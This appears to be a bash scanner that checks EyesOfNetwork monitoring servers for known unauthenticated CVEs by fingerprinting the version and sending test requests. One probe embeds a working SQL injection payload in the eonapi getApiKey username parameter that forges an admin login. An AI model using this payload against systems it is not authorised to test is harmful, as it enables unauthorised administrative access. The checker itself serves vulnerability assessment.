#!/bin/bash

logfile=/tmp/EyesOfNetwork_Vuln_Verifier.dat
touch $logfile

banner()
{
clear
echo "                 ,*-."
echo '                 |  |'
echo '             ,.  |  |'
echo '             | |_|  | ,.'
echo '             `---.  |_| |'
echo '                 |  .--`'
echo "                 |  |"
echo "                 |  |"
echo ""
echo "          Don't be a looser"
echo ""
echo "Check your EyesOfNetwork with this identifier"
echo ""
echo "      Unauthentified CVEs Checker"
echo ""
echo "    Entry points checker from hell"
echo ""
echo "           By ArianeBlow"
echo ""
cat $logfile
echo ""
}

HELP()
{
banner
echo "[U.u] you must provide the URL of your EON instance in argument. ex : ./script.sh https://192.168.1.3"
echo "      If you have used a specific port for your EON, you must specify this port in the argument like : https://192.168.2.3:3333"
echo "      Good luck !"
exit    
}

$1
host=$1
#host='https://192.168.0.30'

if [ $(echo $host | grep http -c) = 0 ]; then
    HELP
    exit
fi

#EON-VERSION-IDENTIFIER
EoN_Version_Identifier()
{
echo ""
echo "[-] Getting EyesOfNetwork version"
echo ""
if [ $(curl -s $host/bower.json -k | grep name -c) = 0 ]; then
    echo "[*] Unable to enumerate the version ..." |tee -a $logfile
else
    get_version=$(curl -s $host/bower.json -k | grep name | cut -d ":" -f 2 | cut -d '"' -f2)
    echo "[i] EyesOfNetwork version Identified as $get_version" |tee -a $logfile
    if [ $get_version = "eonweb-5.0" ]; then
        echo "[+] $host is vulnerable in many ways !!! CVE-2017-6087 & CVE-2017-6088 & (EON) > 5.1 Unauthenticated SQL Injection & CVE-2021-27514 & CVE-2021-33525" |tee -a $logfile
        echo ""
        echo "[X_X] No more tests with this VERY (!) old version" |tee -a $logfile
        exit
    fi
    if [ $get_version = "eonweb-5.1" ]; then
         echo "[+] $host is vulnerable to (EON) > 5.1 Unauthenticated SQL Injection & CVE-2020-9465 & CVE-2021-27514 & CVE-2021-33525" |tee -a $logfile
         echo ""
         echo "[X_X] No more tests with this VERY (!) old version" |tee -a $logfile
         exit
    fi
    if [ $get_version = "eonweb-5.2" ]; then
        echo "[X_X] $host is vulnerable to CVE-2020-9465 & CVE-2021-27514 & CVE-2021-33525" |tee -a $logfile
        echo "[i] Update your EoN server dude !" |tee -a $logfile
        exit
    fi

    if [ $get_version = "eonweb-5.3" ]; then 
        echo "[-] More check points needed ... wait ..." |tee -a $logfile
    fi
fi
}

#EON-API-VERSION-IDENTIFIER
API_Version_Identifier()
{
echo ""
echo "[-] Getting EonApi version"
echo ""
if [ $(curl -s "$host/eonapi/getApiKey?&username=ThisIsATest&password=ThisIsATestr" -k | grep api_version -c) = 0 ]; then
    echo "[*] Unable to enumerate EonApi version ..." |tee -a $logfile
else
    get_api=$(curl -s "$host/eonapi/getApiKey?&username=ThisIsATest&password=ThisIsATestr" -k | grep api_version | cut -d '"' -f 4)
    echo "[i] EonApi Version Identified as eonapi-$get_api" |tee -a $logfile
#check CVE-2020-8656
    if [ $(curl -s "$host/eonapi/getApiKey?&username=%27%20union%20select%201,%27admin%27,%271c85d47ff80b5ff2a4dd577e8e5f8e9d%27,0,0,1,1,8%20or%20%27&password=h4knet" -k | grep 200 -c) = 1 ]; then
        echo "[+] Oops ... $host is vulnerable to SQL Injection in eonapi (CVE-2020-8657 - CVE-2020-8656) & CVE-2021-27514 & CVE-2021-33525 & CVE-2020-8654" |tee -a $logfile
    else
        echo "[i] EyesOfNetwork eonapi is up to date ! Nice !" |tee -a $logfile
    fi
fi
}

#check SQLi cookie
sqli_check()
{
if [ $(curl -s -i $host/login.php -k | grep PHPSESSID -c) = 1 ]; then
    echo "[o.Ô] SQLi in cookie parameter's not vulnerable ! Nice !" |tee -a $logfile
else
    echo "[+] Cookie parameter is vulnerable to SQLi ! CVE-2020-9465" |tee -a $logfile
fi
}

#check sessid Brut-Force
brutt()
{
echo ""
echo "[-] Check if the cookie SESSID is vulnerable"
if [ $(curl -s -X POST -I 'username=123&mdp=123' $host/login.php -k | grep PHPSESSID -c) = 1 ]; then
    echo ""
    echo "[*] Sessid cookie is not vulnerable" |tee -a $logfile
else
    echo ""
    echo "[+] sessid COOKIE is vulnerable to brut-force attack ! CVE-2021-27514" |tee -a $logfile
fi
}

banner
EoN_Version_Identifier
banner
sqli_check
banner
API_Version_Identifier
banner
brutt
banner
rm -rf $logfile





